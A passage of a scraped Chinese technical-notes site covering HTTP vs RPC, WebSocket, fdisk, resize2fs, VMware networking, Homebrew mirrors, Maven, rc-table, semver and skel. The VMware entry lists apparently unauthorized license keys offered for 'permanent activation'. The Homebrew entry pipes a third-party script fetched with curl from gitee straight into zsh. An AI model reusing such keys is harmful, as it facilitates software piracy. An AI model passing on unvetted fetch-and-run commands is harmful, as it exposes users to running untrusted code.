要解决这个问题就应该搞清楚 http 使用的 tcp 协议，和我们自定义的 tcp 协议在报文上的区别。 首先要 否认 一点 http 协议相较于 自定义tcp 报文协议，增加的开销在于连接的建立与断开。 第一、http协议是支持连接池复用的，也就是建立一定数量的连接不断开，并不会频繁的创建和销毁连接 第二、http也可以使用 protobuf 这种二进制编码协议对内容进行编码 因此二者即 http 和 rpc 最大的区别还是在 传输协议 上。 通用定义的http1.1协议的tcp报文包含太多废信息，一个POST协议的格式大致如下: HTTP/1.0 200 OK\nContent-Type: text/plain\nContent-Length: 137582\nExpires: Thu, 05 Dec 1997 16:00:00 GMT\nLast-Modified: Wed, 5 August 1996 15:55:28 GMT\nServer: Apache 0.84\n\n<html>\n  <body>Hello World</body>\n</html> 即使编码协议也就是 body 是使用二进制编码协议，报文元数据也就是header头的键值对却使用了文本编码，非常占字节数。\n如上图所使用的报文中有效字节数仅仅占约 30%，也就是70%的时间用于传输元数据废编码。\n当然实际情况下报文内容可能会比这个长，但是报头所占的比例也是非常可观的。 那么假如我们使用自定义tcp协议的报文如下 报头占用的字节数也就只有16个byte，极大地精简了传输内容。\n这也就是为什么后端进程间通常会采用 自定义tcp协议 的 rpc 来进行通信的原因 。 不单效率那么简单 所谓的效率优势是针对 http1.1协议 来讲的，\nhttp2.0协议 已经优化编码效率问题，\n像 grpc 这种 rpc 库使用的就是 http2.0协议。 这么来说吧，http容器的性能测试单位通常是kqps，自定义tpc协议则通常是以 10kqps 到 100kqps 为基准 简单来说成熟的 rpc库相对 http容器，更多的是封装了 \"服务发现\"，\"负载均衡\"，\"熔断降级\" 一类面向服务的高级特性。\n可以这么理解，rpc框架是面向服务的更高级的封装。\n如果把一个http servlet 容器上封装一层服务发现 和 函数代理调用，那它就已经可以做一个rpc框架了。 所以为什么要用rpc调用？ 因为良好的 rpc 调用是 面向服务的封装，针对服务的 可用性 和 效率 等都做了优化。单纯使用http调用则缺少了这些特性。 可以这样说：用http不是因为它性能好，而是因为它普适，随便一个web容器就能跑起来你的应用。 RPC 底层实现 一张图说明 上图是一个比较完整的关系图，这时我们发现HTTP（图中蓝色框）出现了两次。 其中一个是 和 RPC并列的，都是跨应用调用方法的解决方案； 另一个则是被RPC包含的，是RPC通信过程的可选协议之一。 通常， RPC要求在调用方中放置被调用的方法的接口 。\n调用方只要调用了这些接口，就相当于调用了被调用方的实际方法，十分易用。\n于是，调用方可以像调用内部接口一样调用远程的方法，而不用封装参数名和参数值等操作。 实现过程 首先，调用方调用的是接口，必须得为接口构造一个假的实现。显然，要使用动态代理。这样，调用方的调用就被动态代理接收到了。 第二、动态代理接收到调用后，应该想办法调用远程的实际实现。这包括下面几步： 识别具体要调用的远程方法的 IP、端口 将调用方法的入参进行序列化 通过通信将请求发送到远程的方法中 第三、这样，远程的服务就接收到了调用方的请求。它应该： 反序列化各个调用参数 定位到实际要调用的方法，然后输入参数，执行方法 按照调用的路径返回调用的结果 过程图 这样，RPC操作就完成了。\n调用方 调用内部的一个方法，会被 RPC框架 偷梁换柱为 远程 的 一个方法。\n他们之间的通信数据可读性不需要好，只需要RPC框架能读懂即可，因此效率可以更高。\n通常使用UDP或者TCP作为通讯协议，当然也可以使用HTTP。 杂谈-WebSocket HTTP 与 WebSocket WebSocket 协议实际上也是请求方与服务器之间用来进行数据传输的，\n它比 HTTP 协议初始版本出现的时间更晚，那为什么有了 HTTP 协议之后还要创建一个 WebSocket 协议呢？ 实际上早期的 HTTP 1.x 版本中，服务器一直是作为被动响应的那一方，\n也就是说服务器只有接收到来自请求方的请求之后之后才能针对性的做出响应；\n但有时候服务器可以判断请求方请求的资源是否必须与其他资源关联使用，\n如果服务器能够主动推送该资源就能避免请求方发送额外的请求，从而优化性能，\n因此 HTTP 2 开始就引入了服务器推送机制解决上面的问题（服务器不一定需要在响应请求方的时候才能推送，也可以主动推送）\n但 HTTP 2 直到 2015 年才推出，\n早期的 HTTP 1.x 版本设计用于在网页上展示文本等信息，\n随着网页游戏的诞生设计者意识到了服务器需要主动和请求方进行数据传输，\n在 HTTP 2 出现之前的这个阶段，诞生了 WebSocket 用于解决这个问题！ 现代化传输方式 我们都知道，日常生活中使用浏览器可以用来看文字信息，看视频和玩网页游戏等，\n这就涉及到了应用 HTTP 和 WebSocket 两种协议的过程，\n所以在 HTTP 2 诞生前，浏览器与服务器建立起 TCP 连接后，\n通常先利用 HTTP 协议进行一次数据传输，当需要使用到 WebSocket 协议时，\n请求方会在请求报文的头部字段添加 Upgrade 字段 (表示切换协议)，\n对应值为 WebSocket 表示将 HTTP 协议升级到 WebSocket 协议（但这并不意味着 WebSocket 协议基于 HTTP 协议，这样做只是为了切换更加方便）\n同时添加 Sec-WebSocket-Key 字段并将值设置为随机生成的 base64 码，\n服务器收到请求后会检查是否支持 WebSocket 协议，\n如果支持就会利用公开的算法将这段 base64 码加密后放在响应报文字段中返回，\n并返回状态码 101 Switching Protocals`（协议切换）请求方接收到响应报文后会利用同样的算法将自身的 base64 码加密，\n如果结果和响应报文中的一致则双方的 `WebSocket 连接便建立，用时 1 RTT 杂谈-TCP 粘包 发送端粘包： TCP 连接中会将报文段限制在 MSS（Max Segment Size） 大小，\n因此一些报文段时常需要进行分割，\n而 TCP 内部默认开启 Nagle 算法对较小的报文进行合并发送，\n这是导致粘包的一个原因，可以通过关闭 Nagle 算法避免； TCP 连接的发送方会将报文段放在缓存区，尽量等待缓存区装满之后再发送，这也会导致粘包； 接收端粘包： TCP 连接的接收方未及时取走到达缓存区的报文段导致粘包 参考: 从 RPC 到 HTTP 到 WebSocket RPC 和 HTTP 理解，看完这一篇就够了 HTTP 与 RPC 接口区别","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-Http-know.html","loc":"/yq-docs-Chaotic-computer-network-Http-know.html"},{"title":"fdisk","text":"磁盘分区管理 用法 fdisk [ options ] <disk> change partition table\nfdisk [ options ] -l <disk> list partition table ( s ) fdisk -s <partition> give partition size ( s ) in blocks 选项 -b <size> sector size (512, 1024, 2048 or 4096) -c switch off DOS-compatible mode -h print help -u <size> give sizes in sectors instead of cylinders -v print version -C <number> specify the number of cylinders -H <number> specify the number of heads -S <number> specify the number of sectors per track -l 显示分区信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-fdisk.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-fdisk.html"},{"title":"resize2fs","text":"参考: resize2fs命令 – 同步文件系统容量到内核 resize2fs命令来自英文词组resize to filesystem的缩写，其功能是同步文件系统容量到内核。\n如, 对EXT3、EXT4、XFS等设备卷容量进行了调整，则需要使用resize2fs命令同步信息到系统内核。 语法格式: resize2fs 参数 设备名 参数选项 -d 打开调试特性 -M 将文件系统缩小到最小值 -f 强制调整设备容量而不询问 -p 显示已完成的百分比进度条 -F 刷新文件系统设备的缓冲区 -P 显示文件系统的最小值 参考示例 同步文件系统容量信息到系统内核 [ root@linuxcool ~ ] # resize2fs /dev/sdb resize2fs 1 .44.3 ( 10 -July-2018 ) The filesystem is already 5242880 ( 4k ) blocks long. Nothing to do ! 同步文件系统容量信息到系统内核，并显示百分比进度条： [ root@linuxcool ~ ] # resize2fs -p /dev/sdb 强制同步系统容量信息到系统内核： [ root@linuxcool ~ ] # resize2fs -f /dev/sdb 刷新文件系统设备的缓冲区，随后同步容量信息到系统内核： [ root@linuxcool ~ ] # resize2fs -F /dev/sdb","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-resize2fs.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-resize2fs.html"},{"title":"VMware Workstation","text":"VMware Workstation 是一个 Windows 下的虚拟机客户端(模拟硬件). 用于虚拟机的创建管理使用. 注解 VMware Workstation Pro 16 许可证密钥，批量永久激活！: ZF3R0-FHED2-M80TY-8QYGC-NPKYF\n\nYF390-0HF8P-M81RQ-2DXQE-M2UT6\n\nZF71R-DMX85-08DQY-8YMNC-PPHV8 当我们安装VMware Workstation后，在 宿主机 （物理电脑）\n上会多出两个网卡，VMNet1、VMNet8，\n在虚拟机设置里会多出一个配置 VMNet0。 vmnet1和vmnet8是两个虚拟网卡，主要作用是让虚拟机可以通过你的宿主机的网线上网。\n注意：如果有\"！\"，说明不能用。\nvmnet1是为host-only方式服务的，vmnet8是为NAT方式服务的。 一个是设置私有网络（Host Only）时，用来和主机通信的，\n禁用以后就无法正常使用Host-Only模式了，\n另一个是设置网络地址翻译（NAT）时，和主机通讯使用的，\n如果禁用，那么虚拟机在NAT模式下依然可以通过主机网卡访问外网，\n但不能通过内部网络和主机直接通信。\n而使用桥接网络时，则不需要这两个网卡了。 通过NAT方式上网的guest系统与主机通信需要VMnet8网卡的支持，\n使用Host-Only模式的guest系统与主机通信需要VMnet1网卡的支持，\n使用桥接模式上网需要网络中存在DHCP服务器，且提供服务。\nVMnet8提供NAT和DHCP服务，VMnet1提供DHCP服务。 VMNet1 使用的是host-only的链接模式，即虚拟机只能与主机构成内部通信，无法对外网进行访问。 VMNet8 模式： NAT网络模式 场景： 在宿主机安装多台虚拟机，和宿主组成一个小局域网，\n宿主机，虚拟机之间都可以互相通信，虚拟机也可访问外网，\n例如 搭建 hadoop 集群，分布式服务 使用Vmnet8虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。 VMNet0 模式： 使用桥接模式，安装VM后，在VM里建立虚拟机 默认 就是该模式。 场景： 如果你只是需要一台虚拟机可以和宿主互通，并可以访问外网，此模式即可。 描述： 安装虚拟机系统后不需要调整网络，物理网络中的 \"路由\" 所包含的DHCP服务器会自动识别该虚拟机并为其分配IP地址； 如果没有路由，可以自己手动在系统分配，原则是和宿主机在同一网段并指向相同的网关即可通信。 虚拟机支持3种常用网络模式 参考: Vmware虚拟机三种网络模式详解 Bridge模式 虚拟机作为独立的计算，和宿主机同样连接到外部网络。\n如果局域网中是DHCP，将虚拟机设置为静态ip，存在ip冲突的风险。 桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。\n在桥接的作用下，类似于把物理主机虚拟为一个交换机，\n所有桥接设置的虚拟机连接到这个交换机的一个接口上，\n物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，\n相互可以访问而不干扰。 在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。 NAT模式 虚拟机可以访问宿主机和网络，宿主机不能访问虚拟机。 如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，\n这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。 在NAT模式中，主机网卡直接与虚拟NAT设备相连，\n然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，\n这样就实现了虚拟机联网。那么我们会觉得很奇怪，\n为什么需要虚拟网卡VMware Network Adapter VMnet8呢？ 原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。 Host-Only模式 虚拟机和宿主机可以互相访问，但是虚拟机不能访问网络。 Host-Only模式其实就是NAT模式去除了虚拟NAT设备，\n然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，\nHost-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。 问题总结 NAT模式下，虚拟机无法ping通物理机 虚拟机A1、A2是主机A中的虚拟机，虚拟机B1是主机B中的虚拟机。\n其中的\"NAT路由器\"是只启用了NAT功能的路由器，\n用来把VMnet8交换机上连接的计算机通过NAT功能连接到VMnet0虚拟交换机。 A1、A2、B1设置为NAT方式，此时A1、A2可以单向访问主机B、C，而B、C不能访问A1、A2；\nB1可以单向访问主机A、C，而A、C不能访问B1；\nA1、A2与A，B1与B可以互访。 Linux 下VMWare虚拟机下的几种网络连接方式以及和windows之间的文件传输 其他 设置IP地址的时候 以下不能使用: 192.168.191.0   代表网络号\n\n192.168.191.255 代表广播地址\n\n192.168.191.2   代表网关\n\n192.168.191.1   这个被主机用了 (windows主机) 所以能用的IP地址就只有3~254了。 Linux虚拟机扩容 虚拟机关机,\n打开改机器的设置, 大致这样配置(如果有快照得先删除, 不然不能拓展) 开机进入机器,\n查看磁盘大小 df -h 可以看到新分配的磁盘还没有应用 查看磁盘分区表 sudo fdisk -l 可以看到整个磁盘在 /dev/sda , 已经分配了 /dev/sda1 到 /dev/sda3 ,\n所以接下来考虑自己的需求 注解 已经知道是 /dev/sda , 后续查看分区可以直接使用 sudo fdisk -l /dev/sda 如果是扩容, 就在原有的 /dev/sda3 拓展; 如果想加分区, 就需要新创建一个 /dev/sda4 ; 我这里是选择扩容 配置 sda 磁盘 sudo fdisk /dev/sda # 大致指令 d # 删除分区 sda3 n # 新建分区 # 详细输出 命令 ( 输入 m 获取帮助 ) ： d\n分区号 ( 1 -3, 默认 3 ) :\n\n分区 3 已删除。\n\n命令 ( 输入 m 获取帮助 ) ： n\n分区号 ( 3 -128, 默认 3 ) :\n第一个扇区 ( 1054720 -536870878, 默认 1054720 ) :\nLast sector, +/-sectors or +/-size { K,M,G,T,P } ( 1054720 -536870878, 默认 536870878 ) :\n\n创建了一个新分区 3 ，类型为\"Linux filesystem\"，大小为 255 .5 GiB。\n分区 #3 包含一个 ext4 签名。 您想移除该签名吗？ 是 [ Y ] /否 [ N ] ： n\n\n命令 ( 输入 m 获取帮助 ) ： w\n\n分区表已调整。\n正在同步磁盘。 刷新分区表 $ sudo partprobe 同步新的分区大小 $ sudo resize2fs /dev/sda3\nresize2fs 1 .46.5 ( 30 -Dec-2021 ) /dev/sda3 上的文件系统已被挂载于 /；需要进行在线调整大小 old_desc_blocks = 10 , new_desc_blocks = 32 /dev/sda3 上的文件系统大小已经调整为 66977019 个块（每块 4k）。 查看分区大小 $ sudo fdisk -l /dev/sda\nDisk /dev/sda：256 GiB，274877906944 字节，536870912 个扇区\nDisk model: VMware Virtual S\n单元：扇区 / 1 * 512 = 512 字节\n扇区大小 ( 逻辑/物理 ) ：512 字节 / 512 字节\nI/O 大小 ( 最小/最佳 ) ：512 字节 / 512 字节\n磁盘标签类型：gpt\n磁盘标识符：C84E1208-177A-42AB-B5A5-2EB6013A71A6\n\n设备 起点 末尾 扇区 大小 类型\n/dev/sda1 2048 4095 2048 1M BIOS 启动\n/dev/sda2 4096 1054719 1050624 513M EFI 系统\n/dev/sda3 1054720 536870878 535816159 255 .5G Linux 文件系统 注解 Linux下没有直接扩容的方法, 必须先删除再新建(至少暂时我没找到) 还有一种方式就是使用图形软件 Gparted , 安装: sudo apt install gparted , 这部分是看别人有用, 参考 VMware虚拟机扩容磁盘，有很详细图文 ,\n我自己没试过. 最后注意, 看准确要挂的是哪个磁盘(曾因为这个原因找到半天) 参考:: https://blog.csdn.net/sx_1706/article/details/127673151 VMware虚拟机扩容--保姆级教学","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Vmware-workstation.html"},{"title":"mac的包管理器brew","text":"自从升级到macos13之后, 使用brew下载就非常的慢, 稍微看了一下输出,\n大概是国内源没有13版本的包, 所以最后还是去外面下载...\n于是, 就找了一下有没有处理办法. mac下包管理器最常用的有brew与macport, 网上说后者的包要多很多. 这里只谈brew 相关资源: 官网: https://brew.sh/index_zh-cn github地址 清华源配置相关: https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ , 很多源都可以在这个域名找. 安装brew 国内源下载 /bin/zsh -c \" $( curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh ) \" 把脚本搞下来了, /resources/code/homebrew_zh.sh 一开始用的2清华源, 结果慢的要死. 然后换成1中科大的源, 快多了 卸载brew 卸载脚本: /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)\" 同样拉下来了, /resources/code/homebrew_uninstall_zh.sh 一些说明 brew Homebrew 源代码仓库 homebrew-core Homebrew 核心软件仓库 homebrew-bottles Homebrew 预编译二进制软件包 homebrew-cask MacOS 客户端应用 Homebrew国内镜像源目前主要有中科大镜像、阿里镜像、清华镜像。 指令说明 查看brew.git源: cd \"$(brew --repo)\" && git remote -v 查看 homebrew-core.git 当前源: cd \"$(brew --repo homebrew/core)\" && git remote -v 选项/参数 update 更新所有本地仓库, 默认更新release. install <pack> 安装指定的 pack info <pack> 查看已安装 pack 的信息 search <pack> 从仓库搜索与 pack 相关的包信息 注解 输出可能会有 Formulae 与 cask 两种,\n简单理解 , Formulae 列出的包, 是直接通过脚本安装 cli 命令行工具. cask 是简化的图形化GUI安装. Formulae: 命令行工具 cask: 图形化安装 若要安装 cask 类型,  增加 --cask 即可 unlink 当安装的包存在多个版本, 可以使用此指令切换. 如 dart 切换版本 brew unlink dart@<old> && brew unlink dart@<new> && brew link dart@<new> link 见 unlink tap <user/repo> <URL> 即 Third-Party Repositories.\ntap 指的是一个外部仓库，它允许用户安装那些不在 Homebrew 默认仓库中的软件包。\n通过使用 brew tap，用户可以扩展 Homebrew 可用的软件包列表，从而访问更多的工具和应用程序。 效果: 默认 clone https://github.com/<user>/homebrew-<repo> 到本地的 $(brew --repository)/Library/Taps .\n如果指定了 URL , 就从这个 URL .. makes a clone of the repository at https://github.com /<user>/homebrew-<repo> into $(brew --repository)/Library/Taps. 如果不带参数, 表示查看当前已有哪些仓库. untap <user/repo> 与 tap 相反, 移除仓库 仓库分类 可以在 github地址 下看到所有仓库. homebrew-cask-drivers 驱动仓库 homebrew-cask-versions 提供历史版本的软件包。使用 Homebrew 安装软件默认只能安装最新版本 homebrew-cask-fonts 字体库。主要偏向程序员使用的字体，因为这些字体往往是开源免费的 homebrew-aliases 提供设置 Homebrew 指令别名的指令。比如自定义 Homebrew 的指令，\n把 brew install 设置快捷指令为 brew i 之类: # 添加指令别名\nbrew alias up='update'\nbrew alias i='install' homebrew-livecheck 提供实时更新软件包的指令。\n不用等到release即可更新手里的软件包，实时与软件包git看齐，适合重度用户。 直接 brew livecheck 即可拉去最新的更改 homebrew/command-not-found 找不到指令了？给你个建议。\nUbuntu 上的一个特性，找不到指令时提醒你可以怎么安装，移植到了 macOS。是个辅助神器: # on Ubuntu\n$ when\nThe program 'when' is currently not installed.  You can install it by typing:\nsudo apt-get install when\n\n# on macOS with Homebrew\n$ when\nThe program 'when' is currently not installed. You can install it by typing:\n  brew install when homebrew/services 服务启动指令。比如 Homebrew 安装完 MySQL，可以直接配合brew services使用: brew services start mysql\nbrew services stop mysql\nbrew services restart mysql homebrew-bundle 打包神器。方便在项目目录下根据依赖描述文件，快速安装所需环境。\n直接 brew bundle 即可 常见报错 Command failed with exit 128: git 详细报错: fatal: not in a git directory\nError: Command failed with exit 128: git 因为brew软件仓库实际是使用git来进行管理的, 所以会去本地的仓库目录\n去找, 但是它又不是一个git仓库. 解决办法: 找到本地的安装仓库目录, 然后使用: git config --global --add safe.directory 目录 即可. 如果不知道自己安装在哪了, 可以使用find查找: yanque@yanquedembp ~ % find / -name \"homebrew\"  2>/dev/null\n/usr/local/Homebrew/Library/Taps/homebrew 然后看看有哪些: yanque@yanquedembp ~ % ls /usr/local/Homebrew/Library/Taps/homebrew\nhomebrew-cask         homebrew-core           homebrew-services 然后加进去: yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask\nyanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core\nyanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-services 试过不支持通配符.","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html"},{"title":"Android Studio","text":"跨平台支持, 可以从 https://developer.android.com/studio/index.html 下载安装,\n或者可以用 JetBrains 家的 ToolBox 下安装. MacOS下默认SDK路径: /Users/yanque/Library/Android/sdk 新版本Active.xml没有Design 以前在左下角有个按钮 Design 和 Text 可以手动切换视图与文本,\n新版本取消了这个, 变成了右上角纯图标的形式. 从左到右依次为: 仅文本 文本 + 预览编辑视图 仅预览编辑视图 注解 其他切换方式: 在视图界面, 控件右键选择 Go to xml","tags":"工具软件","url":"/yq-util-android-studio.html","loc":"/yq-util-android-studio.html"},{"title":"Maven","text":"很久之前就用过, 一直到现在才补充记录 安装 MacOS安装: brew install maven 配置镜像 打开安装目录下 conf/settings.xml , 有些系统可能不同,\n比如 MacOS的在安装目录下的其他位置 maven/3.9.6/libexec/conf/settings.xml ,\n在 mirrors 项增加: <mirror>\n    <id>alimaven</id>\n    <name>aliyunmaven</name>\n    <url>https://maven.aliyun.com/repository/central/</url>\n    <!-- <url>http://maven.aliyun.com/nexus/content/repositories/central/</url>  旧版地址-->\n    <mirrorOf>central</mirrorOf>\n</mirror> 阿里云也有官方的配置参考: https://developer.aliyun.com/mvn/guide 选项参数 -X,--debug 生成执行调试输出 常见用法 获取debug信息, 可以用来获取配置文件路径 mvn -X\n\n... [ DEBUG ] Message scheme: color [ DEBUG ] Message styles: debug info warning error success failure strong mojo project [ DEBUG ] Reading global settings from /opt/homebrew/Cellar/maven/3.9.6/libexec/conf/settings.xml\n...","tags":"后端","url":"/yq-docs-rear-end-java-Build-tools-maven.html","loc":"/yq-docs-rear-end-java-Build-tools-maven.html"},{"title":"rc-table","text":"基于React的Table组件, 提供了丰富的功能 相关资源: npm地址: https://www.npmjs.com/package/rc-table 安装 npm i rc-table 使用 简单用例, 源于 npm import Table from 'rc-table' ; const columns = [ { title : 'Name' , dataIndex : 'name' , key : 'name' , width : 100 , }, { title : 'Age' , dataIndex : 'age' , key : 'age' , width : 100 , }, { title : 'Address' , dataIndex : 'address' , key : 'address' , width : 200 , }, { title : 'Operations' , dataIndex : '' , key : 'operations' , render : () => < a href = \"#\" > Delete </ a >, }, ]; const data = [ { name : 'Jack' , age : 28 , address : 'some where' , key : '1' }, { name : 'Rose' , age : 36 , address : 'some where' , key : '2' }, ]; React . render (< Table columns = { columns } data = { data } />, mountNode ); 在 columns 中, 还支持使用 render(value, row, index) 函数自定义显示内容 API Column Props Name Type Default  Description key String key of this column className String className of this column colSpan Number thead colSpan of this column title React Node title of this column dataIndex String display field of the data record width String | Number width of the specific proportion\ncalculation according to the\nwidth of the columns fixed String | Boolean this column will be fixed when table\nscroll horizontally:\ntrue or 'left' or 'right' align String specify how cell content is aligned ellipsis Boolean specify whether cell content be ellipsized rowScope 'row' | 'rowgroup' Set scope attribute for all cells in this column onCell Function(record, index) Set custom props per each cell. onHeaderCell Function(record) Set custom props per each header cell. render Function(value, row,\nindex) The render function of cell, has three params:\nthe text of this cell,\nthe record of this row,\nthe index of this row,\nit's return an object:\n{ children: value, props: { colSpan: 1, rowSpan:1 } } ==> 'children'\nis the text of this cell, props is some setting of this cell,\neg: 'colspan' set td colspan, 'rowspan' set td rowspan","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-rc-table.html","loc":"/yq-docs-front-end-node-Three--party-library-rc-table.html"},{"title":"semver","text":"关键字: 语义化版本 相关资源: npm地址: https://www.npmjs.com/package/semver 安装 npm i semver 使用 const semver = require ( 'semver' ) semver . valid ( '1.2.3' ) // '1.2.3' semver . valid ( 'a.b.c' ) // null semver . clean ( '  =v1.2.3   ' ) // '1.2.3' semver . satisfies ( '1.2.3' , '1.x || >=2.5.0 || 5.0.0 - 7.2.3' ) // true semver . gt ( '1.2.3' , '9.8.7' ) // false semver . lt ( '1.2.3' , '9.8.7' ) // true semver . minVersion ( '>=1.0.0' ) // '1.0.0' semver . valid ( semver . coerce ( 'v2' )) // '2.0.0' semver . valid ( semver . coerce ( '42.6.7.9.3-alpha' )) // '42.6.7' API 比较 gt(v1, v2) v1 > v2 注意, 这些显示比较的函数基本类似, 仅支持 \"1.0.3\" 这样的纯正的版本, 而不支持夹杂符号的 \">=1.0.3\", 否则会直接报错.\n如果要比较某个版本是否匹配夹杂符号的, 需要使用 satisfies gte(v1, v2) v1 >= v2 lt(v1, v2) v1 < v2 lte(v1, v2) v1 <= v2 eq(v1, v2) v1 == v2 如果 v1 和 v2 在意义上是相同的版本，及时原始的字符串不一致, 也返回 true, neq(v1, v2) v1 != v2 与 eq 一致. cmp(v1, comparator, v2) 指定比较字符串, 调用对应的函数 compare(v1, v2) 如果 v1 == v2 , 返回 0. 如果 v1 > v2 , 返回 1. 如果 v1 < v2 , 返回 -1. rcompare(v1, v2) 与 compare 相反. compareBuild(v1, v2) 与 compare 类似, 但是考虑到了当两个版本相等但 build 字段不同.\n如果传递给 Array.sort()，则按升序排序。v2 较大。如果传递给 Array.sort()，则按升序排序。 diff(v1, v2) 返回版本差异, 返回值可以是以下值: \"major\", \"premajor\", \"minor\", \"preminor\", \"patch\", \"prepatch\", or \"prerelease\".\n如果无差异, 返回null satisfies(v1, comparator_v2) comparator_v2表示可包含比较符号, 比如: \">=1.0.3\". 表示 v1 是否满足 v2 的要求. coerce(v_str) 尽可能将字符串可以转换为 semver 对象. valid(v_semver) 读取 semver 对象所表示的版本字符串, 如果是合法的, 返回版本字符串, 否则返回 null.","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-semver.html","loc":"/yq-docs-front-end-node-Three--party-library-semver.html"},{"title":"skel","text":"前言: 这是一个比较老的纯JS框架, 现在用得较少. 因为都是React这种框架开发了... 相关资源: 响应式布局资源网站: https://html5up.net , 这里整理了很多现成的模版, 觉得哪个好下载下来用即可. skel仓库: https://github.com/ajlkn/skel , 这个是比较火的一个. 仓库skel文档: https://github.com/ajlkn/skel/blob/master/docs/skel.md 仓库Layout文档: https://github.com/ajlkn/skel/blob/master/docs/skel-layout.md 仓库Viewport文档: https://github.com/ajlkn/skel/blob/master/docs/skel-viewport.md 仓库scss文档: https://github.com/ajlkn/skel/blob/master/docs/skel.scss.md skelJS仓库: https://github.com/andreipetcu/skelJS.git , 基于 skel 的某一个master的fork.\n知道这个主要是因为, 自己的静态博客用到了... 作用 响应式布局, 即针对不同的设备, 自动加入不同的样式. 注解 skel项目2018年就废弃了, 后面有了新的 Responsive Tools ,\n参考: Skel JS download 提供的功能 Skel (skel.min.js) 主框架, 提供了JS访问CSS断点, 事件, 其他工具.\n.. (Main framework) Provides JS access to CSS breakpoints, events, and other tools. Layout (skel-layout.min.js) 模块, 增加CSS和页面布局工具, 包括一个CSS网格系统, 浏览器重置等.\n.. (Module) Adds CSS and page layout tools, including a CSS grid system, browser resets and more. Viewport (skel-viewport.min.js) 模块, 增加简化的视口管理（包括对多个视口 <meta> 标签的支持）\n.. (Module) Adds simplified viewport management (including support for multiple viewport <meta> tags). Skel.scss (_skel.scss) Sass框架, 一个基于Sass的Skel实现, 它将某些Skel和布局模块（添加了一些方便的新混合）的某些方面与Skel合并在一起。\n.. (Sass framework) A Sass-based implementation of Skel.\nMerges certain aspects of Skel and its Layout module (while adding some handy new mixins).\nDesigned to work independently or in conjunction with Skel for added effect. 使用 < script src = \"skel.min.js\" > { prefix : \"style\" , resetCSS : true , boxModel : \"border\" , grid : { gutters : 30 }, breakpoints : { wide : { range : \"1200-\" , containers : 1140 , grid : { gutters : 50 } }, narrow : { range : \"481-1199\" , containers : 960 }, mobile : { range : \"-480\" , containers : \"fluid\" , lockViewport : true , grid : { collapse : true } } } } </ script > 先导入框架 < script src = \"skel.min.js\" ></ script > 定义 breakpoints , 每一个项都表示一个名称与对应的媒体查询 skel . breakpoints ({ xlarge : \"(max-width: 1680px)\" , large : \"(max-width: 1280px)\" , medium : \"(max-width: 980px)\" , small : \"(max-width: 736px)\" , xsmall : \"(max-width: 480px)\" }); 然后可以根据在不同媒体查询条件满足的时候做相应的事情 skel . on ( \"+medium -medium\" , function () { // do something }); skel . on ( \"ready\" , function () { /* do DOM ready stuff */ if ( skel . breakpoint ( \"small\" ). active ) { /* do something specific for small displays */ } if ( skel . vars . touch ) { /* enable feature for devices with a touchscreen */ } if ( skel . vars . IEVersion < 9 ) { /* apply workaround for IE<9 */ } }) . on ( \"+large\" , function () { /* do something when \"large\" breakpoint becomes active */ }) . on ( \"-large !large\" , function () { /* do something when \"large\" breakpoint is (or becomes) inactive */ }); Breakpoints使用说明 skel.breakpoints() 格式 skel . breakpoints ({ name : \"media query\" , name : \"media query\" , name : \"media query\" , ... }); name 不能重复,  如上面的 skel . breakpoints ({ xlarge : \"(max-width: 1680px)\" , large : \"(max-width: 1280px)\" , medium : \"(max-width: 980px)\" , small : \"(max-width: 736px)\" , xsmall : \"(max-width: 480px)\" }); 可以通过 skel.breakpoint() 来获取对应的单个 Breakpoint 对象 // Get the \"small\" breakpoint object. var x = skel . breakpoint ( \"small\" ); Breakpoint对象的属性 active: bool 当前媒体查询状态是否已激活.\n.. Set to true if the breakpoint is currently active (ie. the current state of the viewport satisfies its media query), or false if not. wasActive: bool 在最新一次状态变化之前的 breakpoint 状态是否 已激活\n.. Set to true if the breakpoint was active before the last state change, or false if not. name: string breakpoint 名称. media: string breakpoint 对应的 媒体查询(media query). 事件(Events) 对应的媒体查询发生时, 会触发相应的事件. 支持多个. skel . on ( \"event1 event2 ...\" , function () { /* do stuff */ }); 支持的 事件 类型 change 当一个或多个 breakpoints (其实就是所有的 breakpoints )变化时触发. 注意这里的 breakpoints 指的是前面定义的 breakpoints 名称对应的媒体查询.\n.. Triggered when one or more breakpoints become active or inactive. skel . on ( \"change\" , function () { alert ( \"Breakpoints changed!\" ); }); init 当 Skel 初始化时调用\n.. Triggered when Skel initializes. skel . on ( \"init\" , function () { alert ( \"Initialized!\" ); }); ready 当 DOM ready 时调用\n.. Triggered when the DOM is ready. skel . on ( \"ready\" , function () { alert ( \"DOM 